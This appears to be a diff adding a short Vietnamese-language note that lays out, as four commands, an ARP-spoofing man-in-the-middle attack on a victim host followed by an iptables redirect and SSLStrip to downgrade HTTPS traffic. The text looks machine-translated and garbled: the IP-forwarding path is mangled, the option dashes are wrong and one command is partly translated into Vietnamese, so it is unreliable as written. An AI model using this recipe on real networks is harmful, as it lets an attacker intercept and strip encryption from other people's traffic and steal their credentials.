@@ -1,0 +1,8 @@
+1.- Định cấu hình chuyển tiếp IP
+echo 1> / proc / sys / net / ipv4 / ip_osystem
+2.- Thực hiện tấn công ARP MITM giữa 2 máy:
+arpspoof -i eth0 -t VICTIM HOST
+3.- Chuyển hướng lưu lượng truy cập với iptables:
+iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080
+4.- Khởi động SSLStrip trên cổng được sử dụng
+tệp python sslstrip.py -w
